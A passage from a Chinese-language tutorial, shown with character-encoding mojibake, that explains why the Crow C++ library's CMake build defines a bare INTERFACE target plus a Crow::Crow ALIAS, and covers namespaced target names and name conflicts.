<li><strong>ä½œç”¨</strong>ï¼šå°†é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>cmake</code> å­ç›®å½•æ·»åŠ åˆ° CMake æ¨¡å—æœç´¢è·¯å¾„</li>
<li><strong>é‡è¦æ€§</strong>ï¼šä½¿å¾— CMake èƒ½å¤Ÿæ‰¾åˆ°é¡¹ç›®è‡ªå®šä¹‰çš„æ¨¡å—ï¼Œå¦‚ <code>Findasio.cmake</code> å’Œ <code>compiler_options.cmake</code></li>
<li><strong>ä¾èµ–å…³ç³»</strong>ï¼š<code>examples/CMakeLists.txt</code> ä¾èµ–è¿™ä¸ªé…ç½®æ¥æ‰¾åˆ° <code>compiler_options.cmake</code></li>
</ul>
<h4 data-id="heading-5">1.3 æ ¸å¿ƒåº“ç›®æ ‡å®šä¹‰</h4>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)

target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong>å…³é”®ç‚¹åˆ†æ</strong>ï¼š</p>
<ol>
<li>
<p><strong>INTERFACE åº“</strong>ï¼šCrow æ˜¯ä¸€ä¸ª header-only åº“ï¼Œä½¿ç”¨ <code>INTERFACE</code> åº“ç±»å‹ï¼Œè¿™æ„å‘³ç€å®ƒä¸ç¼–è¯‘ä»»ä½•æºæ–‡ä»¶ï¼Œåªæä¾›æ¥å£ï¼ˆå¤´æ–‡ä»¶è·¯å¾„ã€ç¼–è¯‘é€‰é¡¹ã€é“¾æ¥åº“ç­‰ï¼‰</p>
</li>
<li>
<p><strong>åˆ«åç›®æ ‡è¯¦è§£</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow::Crow ALIAS Crow)
</code></pre>
<p><strong>è¯­æ³•è§£æ</strong>ï¼š</p>
<ul>
<li><code>add_library()</code>ï¼šCMake å‘½ä»¤ï¼Œç”¨äºåˆ›å»ºåº“ç›®æ ‡</li>
<li><code>Crow::Crow</code>ï¼šåˆ«åç›®æ ‡çš„åç§°ï¼ˆå¸¦å‘½åç©ºé—´å‰ç¼€ï¼‰</li>
<li><code>ALIAS</code>ï¼šå…³é”®å­—ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåˆ«åï¼Œä¸æ˜¯çœŸæ­£çš„åº“</li>
<li><code>Crow</code>ï¼šè¢«åˆ«åçš„å®é™…ç›®æ ‡åç§°</li>
</ul>
<p><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼š</p>
<ul>
<li><strong>åŠ å‰ç¼€é˜²æ­¢å¼„æ··</strong>ï¼šä¸º <code>Crow</code> ç›®æ ‡æ·»åŠ  <code>Crow::</code> å‘½åç©ºé—´å‰ç¼€ï¼Œé¿å…ä¸å…¶ä»–åŒåç›®æ ‡å†²çª</li>
<li><code>Crow</code> å’Œ <code>Crow::Crow</code> æŒ‡å‘åŒä¸€ä¸ªç›®æ ‡ï¼Œå¯ä»¥äº’æ¢ä½¿ç”¨</li>
<li>ä¾‹å¦‚ï¼š<code>target_link_libraries(myapp Crow)</code> å’Œ <code>target_link_libraries(myapp Crow::Crow)</code> æ•ˆæœç›¸åŒ</li>
</ul>
<p><strong>ç®€å•ç†è§£</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)           # åˆ›å»ºå®é™…ç›®æ ‡ "Crow"
add_library(Crow::Crow ALIAS Crow)    # ç»™ "Crow" åŠ ä¸ªå‰ç¼€ "Crow::"ï¼Œå˜æˆ "Crow::Crow"
</code></pre>
<p>å°±åƒç»™æ–‡ä»¶åŠ ä¸ªæ–‡ä»¶å¤¹å‰ç¼€ä¸€æ ·ï¼š</p>
<ul>
<li><code>Crow</code> â†’ <code>Crow::Crow</code>ï¼ˆåŠ ä¸ªå‘½åç©ºé—´å‰ç¼€ï¼‰</li>
<li>é˜²æ­¢å’Œå…¶ä»–å« <code>Crow</code> çš„ç›®æ ‡å¼„æ··</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ï¼Ÿ</strong></p>
<p>ä½ å¯èƒ½ä¼šé—®ï¼šä¸ºä»€ä¹ˆä¸ç›´æ¥å†™ <code>add_library(Crow::Crow INTERFACE)</code> å‘¢ï¼Ÿ</p>
<p><strong>åŸå›  1ï¼šCMake è¯­æ³•é™åˆ¶</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># âŒ ä¸æ¨èï¼šè™½ç„¶è¯­æ³•ä¸Šå¯ä»¥ï¼Œä½† CMake ä¼šæŠŠ "Crow::Crow" å½“ä½œæ™®é€šç›®æ ‡å
add_library(Crow::Crow INTERFACE)  # è¿™ä¸æ˜¯çœŸæ­£çš„å‘½åç©ºé—´ï¼Œåªæ˜¯åå­—é‡Œå¸¦ "::"

# âœ… æ¨èï¼šå…ˆåˆ›å»ºå®é™…ç›®æ ‡ï¼Œå†ç”¨ ALIAS åˆ›å»ºå‘½åç©ºé—´ç‰ˆæœ¬
add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)
</code></pre>
<p><strong>åŸå›  2ï¼šALIAS çš„é™åˆ¶</strong></p>
<p>ALIAS ç›®æ ‡æœ‰ä¸€äº›é™åˆ¶ï¼Œä¸èƒ½åšæŸäº›æ“ä½œï¼š</p>
<ul>
<li>âŒ ä¸èƒ½ä¿®æ”¹å±æ€§ï¼ˆå¦‚ <code>target_include_directories()</code>ï¼‰</li>
<li>âŒ ä¸èƒ½å®‰è£…ï¼ˆ<code>install(TARGETS ...)</code>ï¼‰</li>
<li>âŒ ä¸èƒ½å¯¼å‡ºï¼ˆ<code>install(EXPORT ...)</code>ï¼‰</li>
<li>âœ… åªèƒ½ä½œä¸ºåŸç›®æ ‡çš„å¦ä¸€ä¸ªåå­—</li>
</ul>
<p>æ‰€ä»¥å®é™…çš„åº“é…ç½®å¿…é¡»åœ¨<strong>è£¸åå­—ç›®æ ‡</strong>ä¸Šå®Œæˆï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)  # âœ… å®é™…ç›®æ ‡ï¼Œå¯ä»¥é…ç½®å±æ€§
target_include_directories(Crow INTERFACE ...)  # âœ… åœ¨è£¸åå­—ç›®æ ‡ä¸Šè®¾ç½®
target_link_libraries(Crow INTERFACE ...)       # âœ… åœ¨è£¸åå­—ç›®æ ‡ä¸Šè®¾ç½®

add_library(Crow::Crow ALIAS Crow)  # âœ… åªæ˜¯åˆ«åï¼ŒæŒ‡å‘ä¸Šé¢çš„ Crow
</code></pre>
<p><strong>é‡è¦æ¾„æ¸…ï¼šCMake ä¸ä¼š"éšè—"åŸç›®æ ‡</strong></p>
<p><strong>å¦‚æœé…ç½®æ“ä½œåªèƒ½åœ¨è£¸åå­—ä¸Šå®Œæˆï¼Œé‚£ä¸ä¼šæš´éœ²è£¸åå­—å—ï¼Ÿ</strong></p>
<p><strong>ç­”æ¡ˆï¼šæ˜¯çš„ï¼Œä¼šæš´éœ²ï¼ä½†è¿™æ˜¯ CMake çš„è®¾è®¡ï¼Œä¸æ˜¯ bugã€‚</strong></p>
<p><strong>å®é™…æƒ…å†µ</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># åº“æä¾›è€…ï¼ˆCrow é¡¹ç›®ï¼‰
add_library(Crow INTERFACE)                    # è£¸åå­—ç›®æ ‡
target_include_directories(Crow INTERFACE include/)  # åœ¨è£¸åå­—ä¸Šé…ç½®
add_library(Crow::Crow ALIAS Crow)            # åˆ›å»ºåˆ«å

# åº“ä½¿ç”¨è€…ï¼ˆä½ çš„é¡¹ç›®ï¼‰
target_link_libraries(myapp Crow)        # âœ… æŠ€æœ¯ä¸Šå¯ä»¥ï¼Œä½†ä¸æ¨è
target_link_libraries(myapp Crow::Crow)  # âœ… æ¨èä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li>
<p><strong>CMake ä¸ä¼šéšè—åŸç›®æ ‡</strong>ï¼š</p>
<ul>
<li><code>Crow</code> å’Œ <code>Crow::Crow</code> <strong>åŒæ—¶å­˜åœ¨</strong>ï¼Œéƒ½å¯ä»¥ä½¿ç”¨</li>
<li>è¿™ä¸æ˜¯"éšè—"ï¼Œè€Œæ˜¯"æä¾›ä¸¤ä¸ªåå­—"</li>
<li>ç”¨æˆ·æŠ€æœ¯ä¸Šå¯ä»¥ä½¿ç”¨ <code>Crow</code>ï¼Œä½†æœ€ä½³å®è·µæ˜¯ä½¿ç”¨ <code>Crow::Crow</code></li>
</ul>
</li>
<li>
<p><strong>è¿™æ˜¯å‘½åçº¦å®šï¼Œä¸æ˜¯çœŸæ­£çš„å°è£…</strong>ï¼š</p>
<ul>
<li>CMake æ²¡æœ‰çœŸæ­£çš„"ç§æœ‰"ç›®æ ‡æ¦‚å¿µ</li>
<li>å‘½åç©ºé—´æ˜¯<strong>çº¦å®š</strong>ï¼Œä¸æ˜¯<strong>å¼ºåˆ¶</strong></li>
<li>å°±åƒ C++ çš„å‘½åç©ºé—´ä¸€æ ·ï¼ŒæŠ€æœ¯ä¸Šå¯ä»¥ç»•è¿‡ï¼Œä½†éµå¾ªçº¦å®šæ›´å¥½</li>
</ul>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<p><strong>çµæ´»æ€§</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># é¡¹ç›®å†…éƒ¨å¯ä»¥ä½¿ç”¨è£¸åå­—ï¼ˆæ›´ç®€æ´ï¼‰
target_link_libraries(internal_lib Crow)  # âœ… å†…éƒ¨ä½¿ç”¨ï¼Œæ›´ç®€æ´

# å¯¹å¤–æ¥å£ä½¿ç”¨å‘½åç©ºé—´ï¼ˆæ›´è§„èŒƒï¼‰
target_link_libraries(public_api Crow::Crow)  # âœ… å…¬å…±æ¥å£ï¼Œæ›´æ¸…æ™°
</code></pre>
<p><strong>å‘åå…¼å®¹</strong>ï¼š</p>
<ul>
<li>å¦‚æœå®Œå…¨éšè—è£¸åå­—ï¼Œä¼šç ´åæ—§ä»£ç </li>
<li>å…è®¸ä¸¤ç§æ–¹å¼ï¼Œä¿æŒå…¼å®¹æ€§</li>
</ul>
<p><strong>å®é™…éœ€æ±‚</strong>ï¼š</p>
<ul>
<li>æœ‰äº›æ“ä½œï¼ˆå¦‚é…ç½®å±æ€§ï¼‰å¿…é¡»åœ¨è£¸åå­—ä¸Šå®Œæˆ</li>
<li>å¦‚æœå®Œå…¨éšè—ï¼Œè¿™äº›æ“ä½œå°±æ— æ³•è¿›è¡Œ</li>
</ul>
</li>
</ol>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>æŸ¥çœ‹ Crow é¡¹ç›®çš„å®é™…ä»£ç ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
add_library(Crow INTERFACE)  # è£¸åå­—ï¼Œç”¨äºé…ç½®
target_include_directories(Crow INTERFACE ...)  # åœ¨è£¸åå­—ä¸Šé…ç½®
target_link_libraries(Crow INTERFACE asio::asio)  # åœ¨è£¸åå­—ä¸Šé…ç½®

add_library(Crow::Crow ALIAS Crow)  # åˆ›å»ºåˆ«åï¼Œæä¾›å‘½åç©ºé—´ç‰ˆæœ¬
</code></pre>
<p>åœ¨ <code>examples/CMakeLists.txt</code> ä¸­ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ‰€æœ‰ç¤ºä¾‹éƒ½ä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆæœ€ä½³å®è·µï¼‰
target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… æ¨è

# æŠ€æœ¯ä¸Šä¹Ÿå¯ä»¥ä½¿ç”¨è£¸åå­—ï¼ˆä½†ä¸æ¨èï¼‰
# target_link_libraries(basic_example PUBLIC Crow)  # âš ï¸ ä¸æ¨èï¼Œä½†å¯ä»¥å·¥ä½œ
</code></pre>
<p><strong>å¯¹æ¯”å…¶ä»–è¯­è¨€</strong>ï¼š</p>
<p>è¿™å°±åƒ C++ çš„å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> crow {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> { ... };
}

<span class="hljs-comment">// å¯ä»¥ä½¿ç”¨å®Œæ•´å‘½åç©ºé—´</span>
crow::App app;  <span class="hljs-comment">// âœ… æ¨è</span>

<span class="hljs-comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨ using å£°æ˜</span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> crow;
App app;  <span class="hljs-comment">// âš ï¸ æŠ€æœ¯ä¸Šå¯ä»¥ï¼Œä½†ä¸æ¨èï¼ˆå¯èƒ½å†²çªï¼‰</span>
</code></pre>
<p>CMake çš„å‘½åç©ºé—´ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼š</p>
<ul>
<li>æ¨èä½¿ç”¨ <code>Crow::Crow</code>ï¼ˆæ¸…æ™°ã€ä¸å†²çªï¼‰</li>
<li>æŠ€æœ¯ä¸Šå¯ä»¥ä½¿ç”¨ <code>Crow</code>ï¼ˆç®€æ´ï¼Œä½†å¯èƒ½å†²çªï¼‰</li>
<li>è¿™æ˜¯çº¦å®šï¼Œä¸æ˜¯å¼ºåˆ¶</li>
</ul>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li><strong>åº“æä¾›è€…</strong>ï¼š
<ul>
<li>åˆ›å»ºè£¸åå­—ç›®æ ‡ç”¨äºé…ç½®</li>
<li>åˆ›å»ºå‘½åç©ºé—´åˆ«åç”¨äºå¯¹å¤–æ¥å£</li>
<li>æ–‡æ¡£ä¸­æ¨èä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬</li>
</ul>
</li>
<li><strong>åº“ä½¿ç”¨è€…</strong>ï¼š
<ul>
<li>æ€»æ˜¯ä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆ<code>Crow::Crow</code>ï¼‰</li>
<li>é¿å…ä½¿ç”¨è£¸åå­—ï¼ˆ<code>Crow</code>ï¼‰ï¼Œé™¤éç¡®å®šä¸ä¼šå†²çª</li>
</ul>
</li>
</ol>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>âœ… <strong>ä¼šæš´éœ²</strong>ï¼šè£¸åå­—ç›®æ ‡ä»ç„¶å¯ç”¨</li>
<li>âœ… <strong>è¿™æ˜¯è®¾è®¡</strong>ï¼šCMake ä¸éšè—åŸç›®æ ‡ï¼Œæä¾›çµæ´»æ€§</li>
<li>âœ… <strong>è¿™æ˜¯çº¦å®š</strong>ï¼šå‘½åç©ºé—´æ˜¯çº¦å®šï¼Œä¸æ˜¯å¼ºåˆ¶å°è£…</li>
<li>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬ï¼Œé¿å…å†²çª</li>
<li>âš ï¸ <strong>æ³¨æ„</strong>ï¼šæŠ€æœ¯ä¸Šå¯ä»¥ä½¿ç”¨è£¸åå­—ï¼Œä½†éµå¾ªçº¦å®šæ›´å¥½</li>
</ul>
<p><strong>åŸå›  3ï¼šè®¾è®¡æ¸…æ™°æ€§</strong></p>
<p>åˆ†ç¦»å®é™…ç›®æ ‡å’Œåˆ«åï¼ŒèŒè´£æ›´æ¸…æ™°ï¼š</p>
<ul>
<li><strong>è£¸åå­—ç›®æ ‡</strong>ï¼ˆ<code>Crow</code>ï¼‰ï¼šè´Ÿè´£å®é™…çš„åº“é…ç½®å’Œå±æ€§è®¾ç½®</li>
<li><strong>å‘½åç©ºé—´åˆ«å</strong>ï¼ˆ<code>Crow::Crow</code>ï¼‰ï¼šè´Ÿè´£æä¾›ç»Ÿä¸€çš„å…¬å…±æ¥å£</li>
</ul>
<p><strong>åŸå›  4ï¼šå…¼å®¹æ€§å’Œçµæ´»æ€§</strong></p>
<p>è¿™ç§æ–¹å¼å¯ä»¥åŒæ—¶æ”¯æŒä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># é¡¹ç›®å†…éƒ¨å¯ä»¥ä½¿ç”¨è£¸åå­—ï¼ˆæ›´ç®€æ´ï¼‰
target_link_libraries(internal_lib Crow)  # âœ… å†…éƒ¨ä½¿ç”¨

# å¯¹å¤–æä¾›å‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆæ›´è§„èŒƒï¼‰
target_link_libraries(public_api Crow::Crow)  # âœ… å…¬å…±æ¥å£
</code></pre>
<p><strong>å®é™…ä¾‹å­å¯¹æ¯”</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># âŒ é”™è¯¯æ–¹å¼ï¼šç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡
add_library(Crow::Crow INTERFACE)  # âš ï¸ CMake æ”¿ç­– CMP0037 ä¸å…è®¸
target_include_directories(Crow::Crow INTERFACE include/)  # âš ï¸ å¯èƒ½æŠ¥é”™æˆ–è­¦å‘Š

# âœ… æ­£ç¡®æ–¹å¼ï¼šå…ˆåˆ›å»ºè£¸åå­—ï¼Œå†åˆ›å»ºåˆ«å
add_library(Crow INTERFACE)
target_include_directories(Crow INTERFACE include/)  # âœ… åœ¨è£¸åå­—ä¸Šé…ç½®
add_library(Crow::Crow ALIAS Crow)  # âœ… åˆ›å»ºå‘½åç©ºé—´åˆ«å
</code></pre>
<p><strong>å…·ä½“é—®é¢˜è¯´æ˜</strong>ï¼š</p>
<ol>
<li><strong>CMake æ”¿ç­–é™åˆ¶ï¼ˆCMP0037ï¼‰</strong>ï¼š
<ul>
<li>CMake è§„å®šï¼šå¸¦ <code>::</code> çš„ç›®æ ‡å<strong>åªèƒ½ç”¨äº ALIAS æˆ– IMPORTED ç›®æ ‡</strong></li>
<li>æ™®é€šç›®æ ‡ï¼ˆå¦‚ <code>add_library(Crow::Crow INTERFACE)</code>ï¼‰ä¸èƒ½ç›´æ¥ä½¿ç”¨å¸¦ <code>::</code> çš„åå­—</li>
<li>å¦‚æœå¼ºåˆ¶ä½¿ç”¨ï¼ŒCMake å¯èƒ½ä¼šï¼š
<ul>
<li>æŠ¥é”™ï¼š<code>Target names may not contain a "::" unless it is an ALIAS or IMPORTED target</code></li>
<li>æˆ–è€…å‘å‡ºè­¦å‘Šï¼Œå–å†³äº CMake ç‰ˆæœ¬å’Œæ”¿ç­–è®¾ç½®</li>
</ul>
</li>
</ul>
</li>
<li><strong>è¡Œä¸ºä¸ç¡®å®š</strong>ï¼š
<ul>
<li>å³ä½¿æŸäº› CMake ç‰ˆæœ¬å…è®¸ï¼Œè¿™ç§è¡Œä¸ºä¹Ÿæ˜¯æœªå®šä¹‰çš„</li>
<li>å¯èƒ½å¯¼è‡´åç»­é…ç½®ã€å®‰è£…ã€å¯¼å‡ºæ—¶å‡ºç°é—®é¢˜</li>
<li>ä¸åŒ CMake ç‰ˆæœ¬å¯èƒ½æœ‰ä¸åŒçš„å¤„ç†æ–¹å¼</li>
</ul>
</li>
<li><strong>ä¸ç¬¦åˆæœ€ä½³å®è·µ</strong>ï¼š
<ul>
<li>ç°ä»£ CMake æ˜ç¡®è¦æ±‚ï¼šæ™®é€šç›®æ ‡ç”¨è£¸åå­—ï¼Œå‘½åç©ºé—´ç”¨ ALIAS</li>
<li>è¿åè¿™ä¸ªçº¦å®šå¯èƒ½å¯¼è‡´å·¥å…·é“¾ã€IDE æ”¯æŒä¸ä½³</li>
</ul>
</li>
</ol>
<p><strong>å®é™…æµ‹è¯•</strong>ï¼š</p>
<p>å¦‚æœä½ å°è¯•ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ï¼ŒCMake é€šå¸¸ä¼šæŠ¥é”™ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">CMake <span class="hljs-keyword">Error</span>: Target names may <span class="hljs-built_in">not</span> contain a <span class="hljs-string">"::"</span> unless it <span class="hljs-built_in">is</span> an <span class="hljs-keyword">ALIAS</span> <span class="hljs-built_in">or</span> IMPORTED target.
</code></pre>
<p>æˆ–è€…åœ¨æŸäº›ç‰ˆæœ¬ä¸­ä¼šè­¦å‘Šï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">CMake</span> <span class="hljs-type">Warning</span>: <span class="hljs-type">Target</span> <span class="hljs-string">"Crow::Crow"</span> contains <span class="hljs-string">"::"</span> but <span class="hljs-keyword">is</span> not an <span class="hljs-type">ALIAS</span> or <span class="hljs-type">IMPORTED</span> target.
</code></pre>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>å¿…é¡»å…ˆç”¨è£¸åå­—åˆ›å»ºå®é™…ç›®æ ‡ï¼ˆå› ä¸ºè¦é…ç½®å±æ€§ï¼‰</li>
<li>ç„¶åç”¨ ALIAS åˆ›å»ºå‘½åç©ºé—´ç‰ˆæœ¬ï¼ˆæä¾›ç»Ÿä¸€æ¥å£ï¼‰</li>
<li>è¿™æ˜¯ CMake çš„è®¾è®¡ï¼Œä¹Ÿæ˜¯æœ€ä½³å®è·µ</li>
</ul>
<p><strong>å†å²åŸå› å’Œè®¾è®¡è€ƒé‡</strong>ï¼š</p>
<p>ä¸ºä»€ä¹ˆä¸ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡å‘¢ï¼Ÿ<strong>å¦‚æœå¯ä»¥ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ï¼Œç¡®å®ä¼šæ›´æ¸…æ™°</strong>ï¼</p>
<pre><code class="hljs language-cmake" lang="cmake"># ç†æƒ³æƒ…å†µï¼ˆå¦‚æœ CMake æ”¯æŒï¼‰
add_library(Crow::Crow INTERFACE)  # ç›´æ¥åˆ›å»ºï¼Œä¸€æ­¥åˆ°ä½ï¼Œå¤šæ¸…æ™°ï¼
target_include_directories(Crow::Crow INTERFACE include/)
</code></pre>
<p>ä½†ç°å®æ˜¯ï¼ŒCMake çš„å†å²è®¾è®¡å¯¼è‡´äº†è¿™ç§"ä¸¤æ­¥èµ°"çš„æ–¹å¼ï¼š</p>
<p><strong>ä¸ºä»€ä¹ˆ CMake è¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<ol>
<li><strong>å†å²æ¼”è¿›</strong>ï¼š
<ul>
<li>CMake æ—©æœŸï¼ˆ2.x æ—¶ä»£ï¼‰æ²¡æœ‰å‘½åç©ºé—´æ¦‚å¿µ</li>
<li>ç›®æ ‡åå°±æ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œæ²¡æœ‰ <code>::</code> çš„ç‰¹æ®Šå«ä¹‰</li>
<li>åæ¥å¼•å…¥å‘½åç©ºé—´æ—¶ï¼Œä¸ºäº†å‘åå…¼å®¹ï¼Œé‡‡ç”¨äº† ALIAS æœºåˆ¶</li>
</ul>
</li>
<li><strong>æŠ€æœ¯é™åˆ¶</strong>ï¼š
<ul>
<li>CMake çš„ç›®æ ‡ç³»ç»Ÿå»ºç«‹åœ¨å¯¹ç›®æ ‡åçš„å­—ç¬¦ä¸²åŒ¹é…ä¸Š</li>
<li>å¸¦ <code>::</code> çš„åå­—éœ€è¦ç‰¹æ®Šå¤„ç†ï¼ŒåŒºåˆ†"æ™®é€šç›®æ ‡"å’Œ"å‘½åç©ºé—´ç›®æ ‡"</li>
<li>ä¸ºäº†ä¿æŒç³»ç»Ÿä¸€è‡´æ€§ï¼Œé™åˆ¶æ™®é€šç›®æ ‡ä¸èƒ½ç›´æ¥ç”¨ <code>::</code></li>
</ul>
</li>
<li><strong>å‘åå…¼å®¹æ€§</strong>ï¼š
<ul>
<li>å¦‚æœå…è®¸æ™®é€šç›®æ ‡ç”¨ <code>::</code>ï¼Œä¼šç ´åå¤§é‡ç°æœ‰é¡¹ç›®</li>
<li>éœ€è¦åŒºåˆ†"æ—§å¼ç›®æ ‡"å’Œ"æ–°å¼å‘½åç©ºé—´ç›®æ ‡"</li>
<li>ALIAS æœºåˆ¶æä¾›äº†ä¸€ä¸ªå¹³æ»‘çš„è¿‡æ¸¡æ–¹æ¡ˆ</li>
</ul>
</li>
</ol>
<p><strong>å¦‚æœé‡æ–°è®¾è®¡ä¼šæ€æ ·ï¼Ÿ</strong></p>
<p>ç†è®ºä¸Šï¼Œå¦‚æœ CMake é‡æ–°è®¾è®¡ï¼Œå¯èƒ½ä¼šè¿™æ ·ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ç†æƒ³è®¾è®¡ï¼ˆå‡è®¾ï¼‰
add_library(Crow::Crow INTERFACE)  # ç›´æ¥åˆ›å»ºå‘½åç©ºé—´ç›®æ ‡
target_include_directories(Crow::Crow INTERFACE include/)
# ä¸éœ€è¦ ALIASï¼Œä¸€æ­¥åˆ°ä½
</code></pre>
<p>è¿™æ ·ç¡®å®æ›´æ¸…æ™°ï¼Œä½†ç°å®æ˜¯ï¼š</p>
<ul>
<li>CMake å·²ç»æ˜¯ä¸€ä¸ªæˆç†Ÿã€å¹¿æ³›ä½¿ç”¨çš„æ„å»ºç³»ç»Ÿ</li>
<li>æ”¹å˜è¿™ä¸ªè®¾è®¡ä¼šç ´åå¤§é‡ç°æœ‰é¡¹ç›®</li>
<li>æ‰€ä»¥åªèƒ½é€šè¿‡ ALIAS æœºåˆ¶æ¥"æ¨¡æ‹Ÿ"å‘½åç©ºé—´</li>
</ul>
<p><strong>ç±»æ¯”ç†è§£</strong>ï¼š</p>
<p>è¿™å°±åƒç¼–ç¨‹è¯­è¨€ä¸­çš„ä¸€äº›"å†å²åŒ…è¢±"ï¼š</p>
<ul>
<li>C++ çš„ <code>std::string</code> vs <code>string</code>ï¼ˆéœ€è¦ <code>using namespace std</code>ï¼‰</li>
<li>JavaScript çš„ <code>var</code> vs <code>let/const</code>ï¼ˆå†å²åŸå› å¯¼è‡´å¤šç§å£°æ˜æ–¹å¼ï¼‰</li>
<li>Python 2 vs Python 3ï¼ˆä¸ºäº†æ”¹è¿›ï¼Œä½†éœ€è¦å…¼å®¹æ€§è€ƒè™‘ï¼‰</li>
</ul>
<p><strong>å®é™…å½±å“</strong>ï¼š</p>
<p>è™½ç„¶è®¾è®¡ä¸Šä¸å¤Ÿç†æƒ³ï¼Œä½†å®é™…ä½¿ç”¨ä¸­ï¼š</p>
<ul>
<li>âœ… ä¸¤è¡Œä»£ç å°±èƒ½è§£å†³ï¼ˆ<code>add_library</code> + <code>add_library ALIAS</code>ï¼‰</li>
<li>âœ… å·²ç»æˆä¸ºæ ‡å‡†åšæ³•ï¼Œæ‰€æœ‰ç°ä»£ CMake é¡¹ç›®éƒ½è¿™æ ·ç”¨</li>
<li>âœ… å·¥å…·é“¾ã€IDE éƒ½å¾ˆå¥½åœ°æ”¯æŒè¿™ç§æ¨¡å¼</li>
<li>âš ï¸ ç¡®å®æœ‰ç‚¹"ç»•"ï¼Œä½†è¿™æ˜¯å†å²åŸå› ï¼Œä¸æ˜¯è®¾è®¡ç¼ºé™·</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼š</p>
<p><strong>ç›´æ¥åˆ›å»ºå¸¦å‘½åç©ºé—´çš„ç›®æ ‡ç¡®å®æ›´æ¸…æ™°</strong>ã€‚ä½† CMake çš„å†å²è®¾è®¡å¯¼è‡´å¿…é¡»ç”¨"è£¸åå­— + ALIAS"çš„æ–¹å¼ã€‚è¿™æ˜¯æŠ€æœ¯å€ºåŠ¡ï¼Œä½†å·²ç»æˆä¸ºäº†äº‹å®æ ‡å‡†ã€‚ä½œä¸ºä½¿ç”¨è€…ï¼Œæˆ‘ä»¬åªèƒ½éµå¾ªè¿™ä¸ªçº¦å®šï¼Œè™½ç„¶å®ƒç¡®å®ä¸å¤Ÿä¼˜é›…ã€‚</p>
<p><strong>å¦‚æœä¸¤ä¸ªè£¸åå­—éƒ½å« <code>Crow</code>ï¼Œä¼šå†²çªå—ï¼Ÿ</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é—®é¢˜ï¼ç­”æ¡ˆæ˜¯ï¼š<strong>ä¼šå†²çªï¼ŒCMake ä¼šæŠ¥é”™</strong>ã€‚</p>
<p><strong>å†²çªåœºæ™¯ 1ï¼šåŒä¸€ä¸ªé¡¹ç›®ä¸­åˆ›å»ºä¸¤ä¸ªåŒåç›®æ ‡</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
add_library(Crow INTERFACE)  # ç¬¬ä¸€ä¸ª Crow
add_library(Crow STATIC crow.cpp)  # âŒ ç¬¬äºŒä¸ª Crowï¼Œä¼šæŠ¥é”™ï¼
</code></pre>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span>: add_library cannot create target <span class="hljs-string">"Crow"</span> because another
target <span class="hljs-keyword">with</span> the same name already exists.
</code></pre>
<p><strong>å†²çªåœºæ™¯ 2ï¼šé€šè¿‡ add_subdirectory å¼•å…¥åŒåç›®æ ‡</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># ä¸»é¡¹ç›® CMakeLists.txt
add_library(Crow INTERFACE)
